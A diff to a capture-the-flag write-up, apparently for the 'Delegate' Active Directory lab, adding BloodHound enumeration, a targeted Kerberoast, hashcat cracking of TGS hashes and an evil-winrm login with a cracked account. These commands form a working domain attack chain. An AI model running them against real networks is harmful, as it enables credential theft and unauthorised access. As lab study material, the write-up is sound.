@@ -2,7 +2,9 @@
 
 * SMB SHARE ENUM
 * USER ENUM VIA SMB
-* BloodHound
+* BLOODHOUND ENUM
+* TARGETED KERBEROAST
+* UNRESTRAINED DELEGATION
 
 # NMAP
 
@@ -117,3 +119,18 @@ SMB         10.10.71.110    445    DC1              delegate.vl\krbtgt          
 SMB         10.10.71.110    445    DC1              delegate.vl\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                                  
 SMB         10.10.71.110    445    DC1              delegate.vl\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain 
 ```
+# BLOODHOUND ENUM
+
+* bloodhound-python -d delegate.vl -v --zip -c All -dc DC1.delegate.vl -ns 10.10.81.68 -u 'A.Briggs' -p '[password]'
+
+![image](https://github.com/reneanto/write-ups/assets/44943249/d8691bc3-a481-4b7a-816e-c4eb65010328)
+
+* python3 targetedKerberoast.py -v -d 'Delegate.vl' -u 'A.Briggs' -p '[password]'
+
+# HASHCAT 
+
+* hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt
+
+# USER OWN
+
+* evilwinrm -u N.Thompson -p '[password]' -i delegate.vl
